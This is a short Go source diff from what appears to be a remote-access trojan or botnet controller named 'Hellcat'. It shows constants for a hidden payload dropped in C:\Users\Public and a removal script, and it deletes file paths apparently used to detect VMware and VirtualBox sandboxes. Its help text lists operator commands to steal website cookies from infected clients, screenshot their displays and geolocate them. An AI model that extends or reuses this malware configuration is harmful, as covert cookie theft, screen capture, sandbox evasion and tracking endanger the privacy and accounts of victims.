@@ -17,16 +17,9 @@ const (
 	REMOVE_SERVICE = "rm.bat"
 	PAYLOAD_PATH   = "C:\\Users\\Public\\"
 	HIDE_FILE      = true
-
-	/*
-		Utils
-	*/
-	VMWARE_PATH = "C:\\Program Files\\VMware\\VMware Tools\\vmtools.dll"
-	VBOX_PATH   = "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxDisp.dll"
 )
 
 const HELP = `
-
 	░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 	░░░░░ ███████ ]▄▄▄▄▄▄▄▄▃ ░░░░░░░░░░░░
 	▂▄▅█████████▅▄▃▂░░░░░ ᵂᵉˡᶜᵒᵐᵉ ᵗᵒ ᴴᵉˡˡᶜᵃᵗ ░░░░░
@@ -47,5 +40,4 @@ const HELP = `
 	/cookie <name> <url> - Retrieve the website's cookies from client.
 	/screen <name> - Screenshot client display.
 	/geoip <city-mmdb> - Retrieve the client geolocation from IPv4.
-	
 `
